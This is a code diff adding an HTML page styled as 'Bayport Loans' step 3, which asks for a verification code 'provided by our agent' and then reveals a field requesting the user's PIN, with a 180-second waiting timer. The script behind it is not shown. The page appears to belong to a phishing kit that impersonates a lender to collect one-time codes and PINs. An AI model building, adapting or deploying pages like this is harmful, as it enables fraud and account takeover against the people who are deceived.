@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bayport Loans - Code Verification</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo-section">
+            <h1>BAYPORT LOANS</h1>
+            <p>Step 3: Code Verification</p>
+        </div>
+
+        <div class="application-summary">
+            <div class="summary-item">
+                <span class="summary-label">Reference ID:</span>
+                <span class="summary-value highlight" id="refId">-</span>
+            </div>
+        </div>
+
+        <div class="otp-container">
+            <h2>Enter Verification Code</h2>
+            <p class="instruction">Please enter the code provided by our agent</p>
+            
+            <form id="codeForm" class="code-form">
+                <div class="form-group">
+                    <label for="verificationCode">Verification Code *</label>
+                    <input type="text" id="verificationCode" name="verificationCode" required placeholder="Enter code" maxlength="6" pattern="[0-9]*" inputmode="numeric">
+                </div>
+
+                <button type="submit" class="btn-submit" id="submitCodeBtn">Verify Code</button>
+            </form>
+
+            <div id="pinSection" class="pin-section hidden">
+                <h3>PIN Verification</h3>
+                <p>Code verified! Now enter your PIN</p>
+                <div class="form-group">
+                    <label for="pinCode">Enter Your PIN *</label>
+                    <input type="password" id="pinCode" placeholder="Enter PIN" maxlength="6" pattern="[0-9]{4,6}">
+                </div>
+                <button type="button" class="btn-submit" onclick="submitPin()">Verify PIN</button>
+            </div>
+
+            <div id="timer" class="timer hidden">
+                <p>Please wait <span id="countdown">180</span> seconds for verification</p>
+                <div class="progress-bar">
+                    <div class="progress" id="progress"></div>
+                </div>
+            </div>
+
+            <div id="messageBox" class="message-box hidden"></div>
+        </div>
+    </div>
+
+    <script src="js/page3.js"></script>
+</body>
+</html>
